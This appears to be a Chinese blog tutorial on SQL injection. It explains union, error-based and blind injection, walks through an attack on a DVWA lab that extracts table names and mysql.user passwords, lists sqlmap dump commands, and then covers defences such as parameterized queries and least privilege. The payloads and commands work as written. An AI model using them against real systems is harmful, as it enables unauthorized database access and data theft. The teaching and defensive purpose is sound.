    <entry>
      <title>SQL注入完全入门指南</title>
      <link href="/2026/06/02/sql-injection-basics/"/>
      <url>/2026/06/02/sql-injection-basics/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>往年的漏洞报告中，注入类漏洞始终位列前三，而其中出现频率最高、危害面最广的就是 <strong>SQL 注入（SQL Injection）</strong>。本文将从原理出发，手把手带你理解并复现 SQL 注入攻击，最后给出实用的防御方案。</p><h2 id="什么是-SQL-注入"><a href="#什么是-SQL-注入" class="headerlink" title="什么是 SQL 注入"></a>什么是 SQL 注入</h2><p>SQL 注入是一种通过将恶意 SQL 语句插入到应用程序输入参数中，从而操控后端数据库的攻击方式。其本质是 <strong>用户输入的数据被当作 SQL 代码执行</strong>。</p><p>举个直观的例子——一个登录查询：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username <span class="operator">=</span> <span class="string">&#x27;admin&#x27;</span> <span class="keyword">AND</span> password <span class="operator">=</span> <span class="string">&#x27;123456&#x27;</span>;</span><br></pre></td></tr></table></figure><p>如果应用将用户输入直接拼接到 SQL 语句中，攻击者输入 <code>admin&#39; --</code> 作为用户名，实际执行的语句就会变成：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username <span class="operator">=</span> <span class="string">&#x27;admin&#x27;</span> <span class="comment">--&#x27; AND password = &#x27;123456&#x27;;</span></span><br></pre></td></tr></table></figure><p><code>--</code> 是 SQL 注释符，后面的密码验证被注释掉了。攻击者不需要密码就能以 admin 身份登录。</p><h2 id="SQL-注入的常见类型"><a href="#SQL-注入的常见类型" class="headerlink" title="SQL 注入的常见类型"></a>SQL 注入的常见类型</h2><h3 id="1-Union-联合查询注入"><a href="#1-Union-联合查询注入" class="headerlink" title="1. Union 联合查询注入"></a>1. Union 联合查询注入</h3><p>最直观的一种注入方式，利用 <code>UNION SELECT</code> 将攻击者想要的数据追加到正常查询结果中。</p><p><strong>前提</strong>：页面会直接显示查询结果。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 正常查询</span></span><br><span class="line"><span class="keyword">SELECT</span> id, name, price <span class="keyword">FROM</span> products <span class="keyword">WHERE</span> id <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 注入后：获取数据库版本和当前用户</span></span><br><span class="line"><span class="keyword">SELECT</span> id, name, price <span class="keyword">FROM</span> products <span class="keyword">WHERE</span> id <span class="operator">=</span> <span class="number">1</span></span><br><span class="line"><span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="number">1</span>, database(), <span class="keyword">user</span>();</span><br></pre></td></tr></table></figure><p><strong>Union 注入三步走</strong>：</p><ol><li>用 <code>ORDER BY</code> 判断列数</li><li>用 <code>UNION SELECT 1,2,3...</code> 确定回显位置</li><li>在回显位置替换为攻击 payload</li></ol><h3 id="2-报错注入"><a href="#2-报错注入" class="headerlink" title="2. 报错注入"></a>2. 报错注入</h3><p>当页面不直接显示数据，但会输出数据库错误信息时使用。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 利用 extractvalue 函数报错获取信息</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; AND extractvalue(1, concat(0x7e, database(), 0x7e)) -- </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-- 利用 updatexml 函数</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">AND</span> updatexml(<span class="number">1</span>, concat(<span class="number">0x7e</span>, <span class="keyword">user</span>(), <span class="number">0x7e</span>), <span class="number">1</span>) <span class="comment">--</span></span><br></pre></td></tr></table></figure><p>常用报错函数：<code>extractvalue</code>、<code>updatexml</code>、<code>floor()</code> + <code>rand()</code>。</p><h3 id="3-布尔盲注"><a href="#3-布尔盲注" class="headerlink" title="3. 布尔盲注"></a>3. 布尔盲注</h3><p>页面完全无回显也无报错，但不同的输入会导致页面返回 <strong>不同状态</strong>（正常&#x2F;异常）。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 判断数据库名的第一个字符</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; AND SUBSTRING(database(), 1, 1) = &#x27;</span>s<span class="string">&#x27; --</span></span><br></pre></td></tr></table></figure><p>注入过程：逐字符猜测 → 根据页面返回状态判断正确与否 → 不断二分缩小范围。</p><h3 id="4-时间盲注"><a href="#4-时间盲注" class="headerlink" title="4. 时间盲注"></a>4. 时间盲注</h3><p>最隐蔽也最耗时的一种——无论输入什么，页面返回都一样，唯一区别是 <strong>响应时间</strong>。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 如果数据库名首字母为 &#x27;s&#x27;，则延迟 5 秒</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; AND IF(SUBSTRING(database(), 1, 1) = &#x27;</span>s<span class="string">&#x27;, SLEEP(5), 0) --</span></span><br></pre></td></tr></table></figure><h2 id="实战演示"><a href="#实战演示" class="headerlink" title="实战演示"></a>实战演示</h2><blockquote><p>请仅在授权测试环境（如 DVWA、SQLI-Labs、本地靶场）中练习。</p></blockquote><h3 id="环境：DVWA-MySQL"><a href="#环境：DVWA-MySQL" class="headerlink" title="环境：DVWA + MySQL"></a>环境：DVWA + MySQL</h3><p><strong>Step 1 — 判断注入点</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">URL: http://localhost/dvwa/vulnerabilities/sqli/?id=1</span><br><span class="line">测试: id=1&#x27;  → 报错 &quot;You have an error in your SQL syntax&quot;</span><br><span class="line">结论: 存在 SQL 注入</span><br></pre></td></tr></table></figure><p><strong>Step 2 — 判断列数</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; ORDER BY 3 --   → 正常</span></span><br><span class="line"><span class="string">id=1&#x27;</span> <span class="keyword">ORDER</span> <span class="keyword">BY</span> <span class="number">4</span> <span class="comment">--   → 报错</span></span><br><span class="line">结论: 查询包含 <span class="number">3</span> 列</span><br></pre></td></tr></table></figure><p><strong>Step 3 — 确定回显位置</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; UNION SELECT 1, 2, 3 --</span></span><br><span class="line"><span class="string">输出: First name: 1  Surname: 2</span></span><br><span class="line"><span class="string">结论: 第 1、2 列有回显</span></span><br></pre></td></tr></table></figure><p><strong>Step 4 — 获取敏感信息</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 数据库名</span></span><br><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; UNION SELECT database(), 2, 3 --</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-- 表名</span></span><br><span class="line"><span class="string">id=1&#x27;</span> <span class="keyword">UNION</span> <span class="keyword">SELECT</span> table_name, <span class="number">2</span>, <span class="number">3</span> <span class="keyword">FROM</span> information_schema.tables <span class="keyword">WHERE</span> table_schema <span class="operator">=</span> database() <span class="comment">--</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 用户密码</span></span><br><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; UNION SELECT user, password, 3 FROM mysql.user --</span></span><br></pre></td></tr></table></figure><h3 id="常见的注入位置"><a href="#常见的注入位置" class="headerlink" title="常见的注入位置"></a>常见的注入位置</h3><p>除了 URL 参数，这些地方也可能存在注入点：</p><table><thead><tr><th>位置</th><th>示例</th></tr></thead><tbody><tr><td>GET&#x2F;POST 参数</td><td><code>?id=1</code>，登录表单</td></tr><tr><td>Cookie</td><td><code>Cookie: user_id=123</code></td></tr><tr><td>HTTP 头</td><td><code>User-Agent</code>、<code>Referer</code>、<code>X-Forwarded-For</code></td></tr><tr><td>JSON&#x2F;XML 输入</td><td><code>&#123;&quot;username&quot;:&quot;admin&quot;&#125;</code></td></tr></tbody></table><h2 id="自动化工具"><a href="#自动化工具" class="headerlink" title="自动化工具"></a>自动化工具</h2><table><thead><tr><th>工具</th><th>用途</th></tr></thead><tbody><tr><td><strong><a href="https://sqlmap.org/">sqlmap</a></strong></td><td>最强大的自动化 SQL 注入检测与利用工具</td></tr><tr><td><strong>Burp Suite</strong></td><td>拦截 HTTP 请求，配合手工测试</td></tr><tr><td><strong>HackBar</strong></td><td>浏览器插件，快速构造 payload</td></tr></tbody></table><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># sqlmap 基本用法</span></span><br><span class="line">sqlmap -u <span class="string">&quot;http://target.com/page.php?id=1&quot;</span> --dbs          <span class="comment"># 列举数据库</span></span><br><span class="line">sqlmap -u <span class="string">&quot;http://target.com/page.php?id=1&quot;</span> -D dbname --tables  <span class="comment"># 列举表</span></span><br><span class="line">sqlmap -u <span class="string">&quot;http://target.com/page.php?id=1&quot;</span> -D dbname -T <span class="built_in">users</span> --dump  <span class="comment"># 导出数据</span></span><br></pre></td></tr></table></figure><h2 id="防御方案"><a href="#防御方案" class="headerlink" title="防御方案"></a>防御方案</h2><h3 id="1-使用参数化查询（首选）"><a href="#1-使用参数化查询（首选）" class="headerlink" title="1. 使用参数化查询（首选）"></a>1. 使用参数化查询（首选）</h3><p>不要拼接字符串，而是使用预编译语句：</p><p><strong>错误做法</strong>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">query</span> <span class="operator">=</span> <span class="string">&quot;SELECT * FROM users WHERE name = &#x27;&quot;</span> + username + <span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line"><span class="type">Statement</span> <span class="variable">stmt</span> <span class="operator">=</span> conn.createStatement();</span><br><span class="line"><span class="type">ResultSet</span> <span class="variable">rs</span> <span class="operator">=</span> stmt.executeQuery(query);</span><br></pre></td></tr></table></figure><p><strong>正确做法</strong>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">query</span> <span class="operator">=</span> <span class="string">&quot;SELECT * FROM users WHERE name = ?&quot;</span>;</span><br><span class="line"><span class="type">PreparedStatement</span> <span class="variable">ps</span> <span class="operator">=</span> conn.prepareStatement(query);</span><br><span class="line">ps.setString(<span class="number">1</span>, username);</span><br><span class="line"><span class="type">ResultSet</span> <span class="variable">rs</span> <span class="operator">=</span> ps.executeQuery();</span><br></pre></td></tr></table></figure><h3 id="2-输入验证与过滤"><a href="#2-输入验证与过滤" class="headerlink" title="2. 输入验证与过滤"></a>2. 输入验证与过滤</h3><ul><li>白名单校验：对数字类型强制转换，对枚举值限定范围</li><li>转义特殊字符：<code>&#39;</code> <code>&quot;</code> <code>\</code> <code>;</code> <code>--</code> <code>#</code> 等</li></ul><h3 id="3-最小权限原则"><a href="#3-最小权限原则" class="headerlink" title="3. 最小权限原则"></a>3. 最小权限原则</h3><p>应用的数据库账户只授予必要权限，禁止使用 <code>root</code> 或 <code>sa</code> 账户连接数据库。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 只给应用必要的权限</span></span><br><span class="line"><span class="keyword">GRANT</span> <span class="keyword">SELECT</span>, <span class="keyword">INSERT</span>, <span class="keyword">UPDATE</span> <span class="keyword">ON</span> mydb.<span class="operator">*</span> <span class="keyword">TO</span> <span class="string">&#x27;app_user&#x27;</span>@<span class="string">&#x27;localhost&#x27;</span>;</span><br><span class="line"><span class="comment">-- 禁止访问系统表</span></span><br><span class="line"><span class="keyword">REVOKE</span> <span class="keyword">ALL</span> <span class="keyword">ON</span> mysql.<span class="operator">*</span> <span class="keyword">FROM</span> <span class="string">&#x27;app_user&#x27;</span>@<span class="string">&#x27;localhost&#x27;</span>;</span><br></pre></td></tr></table></figure><h3 id="4-部署-WAF"><a href="#4-部署-WAF" class="headerlink" title="4. 部署 WAF"></a>4. 部署 WAF</h3><p>使用 ModSecurity、Cloudflare WAF 等拦截常见的注入 payload。</p><h3 id="5-隐藏错误信息"><a href="#5-隐藏错误信息" class="headerlink" title="5. 隐藏错误信息"></a>5. 隐藏错误信息</h3><p>生产环境关闭详细报错，统一返回通用错误页面：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// php.ini</span></span><br><span class="line">display_errors = Off</span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><table><thead><tr><th>层面</th><th>措施</th></tr></thead><tbody><tr><td>代码层</td><td>参数化查询、ORM 框架</td></tr><tr><td>输入层</td><td>白名单校验、类型强制转换</td></tr><tr><td>数据库层</td><td>最小权限、禁用危险函数</td></tr><tr><td>网络层</td><td>WAF 拦截</td></tr><tr><td>运维层</td><td>关闭报错、定期渗透测试</td></tr></tbody></table><p>SQL 注入虽然古老，但在 CVE 年度报告中始终占有一席之地。理解其原理并做好防御，是每一位安全从业者的必修课。</p><hr><blockquote><p>文章仅供学习交流，请勿用于非法用途。</p></blockquote>]]></content>
      
      
